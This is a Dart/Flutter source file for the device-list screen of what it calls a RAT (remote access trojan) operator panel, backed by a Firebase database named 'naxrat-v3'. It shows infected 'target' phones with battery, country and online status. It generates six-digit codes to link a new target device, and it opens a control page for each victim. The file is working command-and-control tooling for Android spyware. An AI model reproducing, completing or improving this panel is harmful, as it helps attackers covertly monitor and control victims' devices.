// ═══════════════════════════════════════════════════════════════════════════
//  DEVICES PAGE — TACTICAL TARGET LIST (VIDEO BG FIXED + ISACTIVE)
// ═══════════════════════════════════════════════════════════════════════════
import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

import 'control_page.dart';
import 'main.dart';

const String kFirebaseUrl = 'https://naxrat-v3-default-rtdb.firebaseio.com';

class DeviceModel {
  final String id;
  final String name;
  final int? battery;
  final String country;
  final bool online;
  final int lastSeen;

  DeviceModel({
    required this.id,
    required this.name,
    required this.battery,
    required this.country,
    required this.online,
    required this.lastSeen,
  });
}

class DevicesPage extends StatefulWidget {
  final String username;
  final String sessionKey;
  final bool isActive;

  const DevicesPage({
    super.key,
    required this.username,
    required this.sessionKey,
    this.isActive = true,
  });

  @override
  State<DevicesPage> createState() => _DevicesPageState();
}

class _DevicesPageState extends State<DevicesPage> with WidgetsBindingObserver {
  List<DeviceModel> _devices = [];
  bool _isLoading = true;
  String? _pairingCode;
  bool _isGenerating = false;
  Timer? _refreshTimer;

  // ── VIDEO BG ──
  VideoPlayerController? _vCtrl;
  bool _videoReady = false;
  bool _videoInitializing = false;
  int _retry = 0;
  final GlobalKey _videoKey = GlobalKey();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    if (widget.isActive) {
      WidgetsBinding.instance.addPostFrameCallback((_) => _initVideo());
    }
    _loadDevices();
    _refreshTimer =
        Timer.periodic(const Duration(seconds: 3), (_) => _loadDevices());
  }

  @override
  void didUpdateWidget(covariant DevicesPage oldWidget) {
    super.didUpdateWidget(oldWidget);
    if (widget.isActive && !_videoReady && !_videoInitializing) {
      _initVideo();
    } else if (!widget.isActive && _vCtrl != null) {
      final c = _vCtrl;
      _vCtrl = null;
      _videoReady = false;
      if (c != null) {
        try {
          c.pause();
        } catch (_) {}
        try {
          c.dispose();
        } catch (_) {}
      }
    }
  }

  Future<void> _initVideo() async {
    if (_videoInitializing) return;
    _videoInitializing = true;

    try {
      final old = _vCtrl;
      _vCtrl = null;
      if (old != null) {
        try {
          await old.pause();
        } catch (_) {}
        try {
          await old.dispose();
        } catch (_) {}
      }

      final c = VideoPlayerController.asset('assets/videos/background.mp4');
      await c.initialize();
      await c.setLooping(true);
      await c.setVolume(0);

      c.addListener(() {
        final v = c.value;
        if (v.isInitialized &&
            !v.isPlaying &&
            v.position >= v.duration &&
            v.duration > Duration.zero) {
          c.seekTo(Duration.zero).catchError((_) {});
          c.play().catchError((_) {});
        }
      });

      await c.play();

      if (!mounted) {
        await c.dispose();
        _videoInitializing = false;
        return;
      }

      setState(() {
        _vCtrl = c;
        _videoReady = true;
      });
    } catch (_) {
      _videoInitializing = false;
      if (!mounted) return;
      if (_retry < 3) {
        _retry++;
        Future.delayed(Duration(milliseconds: 400 * _retry), () {
          if (mounted) _initVideo();
        });
      }
      return;
    }
    _videoInitializing = false;
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    final c = _vCtrl;
    if (c == null || !c.value.isInitialized) return;
    switch (state) {
      case AppLifecycleState.resumed:
        if (widget.isActive && !c.value.isPlaying) {
          c.setVolume(0).catchError((_) {});
          c.setLooping(true).catchError((_) {});
          c.play().catchError((_) {});
        }
        break;
      case AppLifecycleState.paused:
      case AppLifecycleState.inactive:
      case AppLifecycleState.hidden:
        c.pause().catchError((_) {});
        break;
      default:
        break;
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _refreshTimer?.cancel();
    final c = _vCtrl;
    _vCtrl = null;
    if (c != null) {
      try {
        c.pause();
      } catch (_) {}
      try {
        c.dispose();
      } catch (_) {}
    }
    super.dispose();
  }

  Future<void> _generatePairingCode() async {
    if (_isGenerating) return;
    setState(() => _isGenerating = true);

    final rand = Random.secure();
    final code = List.generate(6, (_) => rand.nextInt(10)).join();

    try {
      final url = Uri.parse('$kFirebaseUrl/pair_codes/$code.json');
      final res = await http.put(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'admin_id': widget.username,
          'created_at': DateTime.now().millisecondsSinceEpoch,
          'used': false,
        }),
      );

      if (res.statusCode == 200 || res.statusCode == 204) {
        setState(() {
          _pairingCode = code;
          _isGenerating = false;
        });
        await Clipboard.setData(ClipboardData(text: code));
        _showSnack('CODE $code COPIED!', success: true);
      } else {
        setState(() => _isGenerating = false);
        _showSnack('FAILED TO GENERATE (HTTP ${res.statusCode})', error: true);
      }
    } catch (e) {
      setState(() => _isGenerating = false);
      _showSnack('ERROR: $e', error: true);
    }
  }

  Future<void> _loadDevices() async {
    try {
      final res = await http
          .get(Uri.parse('$kFirebaseUrl/devices.json'))
          .timeout(const Duration(seconds: 10));

      if (res.statusCode != 200) return;
      final data = jsonDecode(res.body);
      if (data == null) {
        if (mounted) {
          setState(() {
            _devices = [];
            _isLoading = false;
          });
        }
        return;
      }

      final now = DateTime.now().millisecondsSinceEpoch;
      final adminId = widget.username;
      final list = <DeviceModel>[];

      (data as Map<String, dynamic>).forEach((id, raw) {
        final d = raw as Map<String, dynamic>;
        if (d['admin_id'] != adminId && d['parent'] != adminId) return;

        int lastSeen = 0;
        final rawSeen = d['last_seen'];
        if (rawSeen is int) lastSeen = rawSeen;
        else if (rawSeen is String) lastSeen = int.tryParse(rawSeen) ?? 0;

        final online = lastSeen > 0 && (now - lastSeen) < 300000;

        int? battery;
        if (d['battery'] is int) battery = d['battery'];
        else if (d['battery'] is double)
          battery = (d['battery'] as double).toInt();

        list.add(DeviceModel(
          id: id,
          name: d['name']?.toString() ?? 'Unknown Device',
          battery: battery,
          country: d['country']?.toString() ?? '—',
          online: online,
          lastSeen: lastSeen,
        ));
      });

      list.sort((a, b) {
        if (a.online && !b.online) return -1;
        if (!a.online && b.online) return 1;
        return b.lastSeen.compareTo(a.lastSeen);
      });

      if (mounted) {
        setState(() {
          _devices = list;
          _isLoading = false;
        });
      }
    } catch (e) {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  void _showSnack(String msg, {bool error = false, bool success = false}) {
    if (!mounted) return;
    final color =
        error ? AppColors.blood : (success ? AppColors.toxic : AppColors.cyan);
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: Colors.black.withOpacity(0.9),
      content: Row(
        children: [
          Icon(error ? Icons.error_outline : Icons.check_circle_outline,
              color: color, size: 20),
          const SizedBox(width: 10),
          Expanded(
            child: Text(msg,
                style: TextStyle(
                    color: color,
                    fontWeight: FontWeight.w800,
                    fontSize: 12,
                    letterSpacing: 1)),
          ),
        ],
      ),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(12),
        side: BorderSide(color: color, width: 1),
      ),
      margin: const EdgeInsets.all(16),
    ));
  }

  String _timeAgo(int ts) {
    if (ts == 0) return '—';
    final diff = DateTime.now().millisecondsSinceEpoch - ts;
    if (diff < 60000) return 'JUST NOW';
    final min = diff ~/ 60000;
    if (min < 60) return '${min}M AGO';
    final hr = min ~/ 60;
    if (hr < 24) return '${hr}H AGO';
    return '${hr ~/ 24}D AGO';
  }

  // ═══ BG VIDEO ═══
  Widget _bgVideo({required Widget child}) {
    final c = _vCtrl;
    final ready = _videoReady && c != null && c.value.isInitialized;

    return Stack(
      fit: StackFit.expand,
      children: [
        Container(color: Colors.black),
        if (!ready)
          Container(
            decoration: const BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [
                  Color(0xFF0A0A0F),
                  Color(0xFF15121C),
                  Color(0xFF0A0A0F),
                ],
              ),
            ),
          ),
        if (ready)
          Positioned.fill(
            child: RepaintBoundary(
              child: ClipRect(
                child: _CoverVideo(
                  key: _videoKey,
                  controller: c,
                ),
              ),
            ),
          ),
        Container(color: Colors.black.withOpacity(0.72)),
        child,
      ],
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: _bgVideo(
        child: SafeArea(
          bottom: false,
          child: RefreshIndicator(
            onRefresh: _loadDevices,
            color: AppColors.blood,
            backgroundColor: Colors.black,
            child: ListView(
              physics: const AlwaysScrollableScrollPhysics(
                  parent: BouncingScrollPhysics()),
              padding: const EdgeInsets.fromLTRB(20, 20, 20, 140),
              children: [
                _buildHeader(),
                const SizedBox(height: 24),
                _buildPairingCard(),
                const SizedBox(height: 28),
                _buildSectionTitle(),
                const SizedBox(height: 14),
                if (_isLoading)
                  const Padding(
                    padding: EdgeInsets.all(24),
                    child: Center(
                      child: CircularProgressIndicator(
                          color: AppColors.blood, strokeWidth: 2),
                    ),
                  ),
                if (!_isLoading && _devices.isEmpty) _buildEmptyState(),
                if (!_isLoading)
                  ..._devices.map((d) => _buildDeviceCard(d)),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ═══ HEADER ═══
  Widget _buildHeader() {
    return _GlassCard(
      padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 18),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: AppColors.blood.withOpacity(0.12),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: AppColors.blood, width: 1.5),
            ),
            child: const Icon(Icons.radar_rounded,
                color: AppColors.blood, size: 26),
          ),
          const SizedBox(width: 14),
          const Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text('TARGET LIST',
                    style: TextStyle(
                        fontSize: 20,
                        fontWeight: FontWeight.w900,
                        color: Colors.white,
                        letterSpacing: 2)),
                SizedBox(height: 4),
                Text('ACTIVE RAT DEVICES',
                    style: TextStyle(
                        fontSize: 11,
                        color: AppColors.textMuted,
                        letterSpacing: 1.5)),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ═══ SECTION TITLE ═══
  Widget _buildSectionTitle() {
    return Row(
      children: [
        const Text('//',
            style: TextStyle(
                fontWeight: FontWeight.w900,
                color: Colors.white,
                fontSize: 16)),
        const SizedBox(width: 8),
        const Text('ACTIVE DEVICES',
            style: TextStyle(
                fontSize: 14,
                fontWeight: FontWeight.w800,
                color: Colors.white,
                letterSpacing: 2)),
        const SizedBox(width: 12),
        Expanded(
            child:
                Container(height: 1, color: Colors.white.withOpacity(0.1))),
        const SizedBox(width: 12),
        Text('${_devices.length} LINKED',
            style: const TextStyle(
                fontSize: 10,
                color: AppColors.cyan,
                letterSpacing: 1,
                fontWeight: FontWeight.w700)),
      ],
    );
  }

  // ═══ PAIRING CARD ═══
  Widget _buildPairingCard() {
    return _GlassCard(
      padding: const EdgeInsets.all(20),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.warning.withOpacity(0.14),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                      color: AppColors.warning.withOpacity(0.6), width: 1),
                ),
                child: const Icon(Icons.qr_code_rounded,
                    color: AppColors.warning, size: 24),
              ),
              const SizedBox(width: 14),
              const Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('PAIRING CODE',
                        style: TextStyle(
                            color: Colors.white,
                            fontSize: 16,
                            fontWeight: FontWeight.w800,
                            letterSpacing: 1)),
                    SizedBox(height: 4),
                    Text('Generate code to link target device',
                        style: TextStyle(
                            color: AppColors.textMuted, fontSize: 11)),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 20),
          if (_pairingCode != null) ...[
            Container(
              padding: const EdgeInsets.symmetric(vertical: 20),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.5),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                    color: AppColors.toxic.withOpacity(0.7), width: 1.5),
                boxShadow: [
                  BoxShadow(
                      color: AppColors.toxic.withOpacity(0.2),
                      blurRadius: 16),
                ],
              ),
              child: Center(
                child: Text(
                  _pairingCode!,
                  style: const TextStyle(
                    color: AppColors.toxic,
                    fontWeight: FontWeight.w900,
                    fontSize: 42,
                    letterSpacing: 14,
                  ),
                ),
              ),
            ),
            const SizedBox(height: 14),
            Row(
              children: [
                Expanded(
                  child: GestureDetector(
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: _pairingCode!));
                      _showSnack('CODE COPIED!', success: true);
                    },
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      decoration: BoxDecoration(
                        color: AppColors.toxic.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                            color: AppColors.toxic.withOpacity(0.6),
                            width: 1),
                      ),
                      child: const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.copy_rounded,
                              color: AppColors.toxic, size: 18),
                          SizedBox(width: 8),
                          Text('COPY',
                              style: TextStyle(
                                  color: AppColors.toxic,
                                  fontSize: 12,
                                  fontWeight: FontWeight.w800,
                                  letterSpacing: 1.5)),
                        ],
                      ),
                    ),
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: GestureDetector(
                    onTap: () => setState(() => _pairingCode = null),
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      decoration: BoxDecoration(
                        color: AppColors.blood.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                            color: AppColors.blood.withOpacity(0.6),
                            width: 1),
                      ),
                      child: const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.close_rounded,
                              color: AppColors.blood, size: 18),
                          SizedBox(width: 8),
                          Text('CLOSE',
                              style: TextStyle(
                                  color: AppColors.blood,
                                  fontSize: 12,
                                  fontWeight: FontWeight.w800,
                                  letterSpacing: 1.5)),
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ] else
            GestureDetector(
              onTap: _isGenerating ? null : _generatePairingCode,
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 200),
                padding: const EdgeInsets.symmetric(vertical: 16),
                decoration: BoxDecoration(
                  color: _isGenerating
                      ? Colors.white.withOpacity(0.06)
                      : AppColors.blood,
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(
                      color: _isGenerating
                          ? Colors.white.withOpacity(0.12)
                          : AppColors.blood,
                      width: 1.5),
                  boxShadow: _isGenerating
                      ? []
                      : [
                          BoxShadow(
                              color: AppColors.blood.withOpacity(0.4),
                              blurRadius: 16,
                              offset: const Offset(0, 6)),
                        ],
                ),
                child: Center(
                  child: _isGenerating
                      ? const SizedBox(
                          width: 22,
                          height: 22,
                          child: CircularProgressIndicator(
                              color: AppColors.textMuted, strokeWidth: 2))
                      : const Text('GENERATE CODE',
                          style: TextStyle(
                              fontSize: 14,
                              fontWeight: FontWeight.w900,
                              color: Colors.black,
                              letterSpacing: 2.5)),
                ),
              ),
            ),
        ],
      ),
    );
  }

  // ═══ EMPTY STATE ═══
  Widget _buildEmptyState() {
    return _GlassCard(
      padding: const EdgeInsets.all(32),
      child: const Column(
        children: [
          Icon(Icons.radar_rounded, color: AppColors.textMuted, size: 56),
          SizedBox(height: 14),
          Text('NO TARGETS FOUND',
              style: TextStyle(
                  color: Colors.white,
                  fontSize: 16,
                  fontWeight: FontWeight.w800,
                  letterSpacing: 1)),
          SizedBox(height: 8),
          Text(
            'Generate pairing code and enter it on the target device to establish connection.',
            textAlign: TextAlign.center,
            style: TextStyle(
                color: AppColors.textMuted, fontSize: 11, height: 1.5),
          ),
        ],
      ),
    );
  }

  // ═══ DEVICE CARD ═══
  Widget _buildDeviceCard(DeviceModel d) {
    final batt = d.battery ?? 0;
    final battColor = batt > 50
        ? AppColors.toxic
        : (batt > 20 ? AppColors.warning : AppColors.blood);
    final accent = d.online ? AppColors.toxic : AppColors.blood;

    return GestureDetector(
      onTap: () {
        HapticFeedback.mediumImpact();
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (_) => ControlPage(
              deviceId: d.id,
              deviceName: d.name,
              username: widget.username,
              sessionKey: widget.sessionKey,
            ),
          ),
        );
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 14),
        child: _GlassCard(
          padding: const EdgeInsets.all(18),
          child: Column(
            children: [
              Row(
                children: [
                  Container(
                    width: 52,
                    height: 52,
                    decoration: BoxDecoration(
                      color: accent.withOpacity(0.14),
                      borderRadius: BorderRadius.circular(14),
                      border: Border.all(
                          color: accent.withOpacity(0.6), width: 1.5),
                    ),
                    child: Icon(Icons.phone_android_rounded,
                        color: accent, size: 26),
                  ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          d.name.toUpperCase(),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                          style: const TextStyle(
                              color: Colors.white,
                              fontSize: 15,
                              fontWeight: FontWeight.w800,
                              letterSpacing: 1),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 8, vertical: 3),
                              decoration: BoxDecoration(
                                color: accent,
                                borderRadius: BorderRadius.circular(4),
                              ),
                              child: Text(
                                d.online ? 'ONLINE' : 'OFFLINE',
                                style: const TextStyle(
                                    color: Colors.black,
                                    fontSize: 9,
                                    fontWeight: FontWeight.w900,
                                    letterSpacing: 1),
                              ),
                            ),
                            const SizedBox(width: 8),
                            Text(d.country.toUpperCase(),
                                style: const TextStyle(
                                    color: AppColors.textMuted,
                                    fontSize: 10,
                                    letterSpacing: 1)),
                          ],
                        )
                      ],
                    ),
                  ),
                  const Icon(Icons.chevron_right_rounded,
                      color: AppColors.textMuted, size: 26),
                ],
              ),
              const SizedBox(height: 14),
              Container(height: 1, color: Colors.white.withOpacity(0.08)),
              const SizedBox(height: 12),
              Row(
                children: [
                  const Icon(Icons.access_time_rounded,
                      size: 14, color: AppColors.textMuted),
                  const SizedBox(width: 6),
                  Text(_timeAgo(d.lastSeen),
                      style: const TextStyle(
                          color: AppColors.textMuted,
                          fontSize: 11,
                          letterSpacing: 1)),
                  const Spacer(),
                  if (d.battery != null) ...[
                    Icon(Icons.battery_full_rounded,
                        size: 16, color: battColor),
                    const SizedBox(width: 4),
                    Text('$batt%',
                        style: TextStyle(
                            color: battColor,
                            fontSize: 12,
                            fontWeight: FontWeight.w800)),
                  ] else
                    const Text('PWR: ??',
                        style: TextStyle(
                            color: AppColors.textMuted,
                            fontSize: 11,
                            fontWeight: FontWeight.w800)),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// GLASS CARD
// ═══════════════════════════════════════════════════════════════════════════
class _GlassCard extends StatelessWidget {
  final Widget child;
  final EdgeInsetsGeometry padding;
  const _GlassCard({
    required this.child,
    this.padding = const EdgeInsets.all(20),
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(18),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.35),
            blurRadius: 18,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(18),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 12, sigmaY: 12),
          child: Container(
            padding: padding,
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.4),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(
                  color: Colors.white.withOpacity(0.1), width: 1),
            ),
            child: child,
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// COVER VIDEO — full-cover, no black frame
// ═══════════════════════════════════════════════════════════════════════════
class _CoverVideo extends StatelessWidget {
  final VideoPlayerController controller;
  const _CoverVideo({super.key, required this.controller});

  @override
  Widget build(BuildContext context) {
    final size = controller.value.size;
    if (size.width == 0 || size.height == 0) {
      return const SizedBox.shrink();
    }
    return LayoutBuilder(
      builder: (context, constraints) {
        final screenW = constraints.maxWidth;
        final screenH = constraints.maxHeight;
        final scale = (screenW / size.width) > (screenH / size.height)
            ? (screenW / size.width)
            : (screenH / size.height);
        final w = size.width * scale;
        final h = size.height * scale;
        return OverflowBox(
          maxWidth: w,
          maxHeight: h,
          minWidth: w,
          minHeight: h,
          alignment: Alignment.center,
          child: SizedBox(
            width: w,
            height: h,
            child: VideoPlayer(controller),
          ),
        );
      },
    );
  }
}